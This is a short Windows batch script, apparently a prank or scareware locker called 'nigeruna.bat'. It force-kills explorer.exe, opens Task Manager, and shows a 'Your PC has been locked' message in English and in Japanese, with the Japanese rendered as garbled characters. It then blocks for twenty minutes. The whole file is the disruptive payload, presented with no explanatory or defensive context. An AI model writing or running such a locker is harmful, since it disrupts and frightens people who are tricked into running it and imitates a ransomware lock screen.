@echo off
start taskmgr.exe >nul
taskkill /f /im explorer.exe >nul
echo ���Ȃ���PC��nigeruna.bat�ɂ�胍�b�N����܂����B
echo Your PC has been locked by nigeruna .bat.
echo ���ꂾ�����g���ĉ������Ă݂�
echo Use this alone to unlock it.
timeout /nobreak 1200 >null
start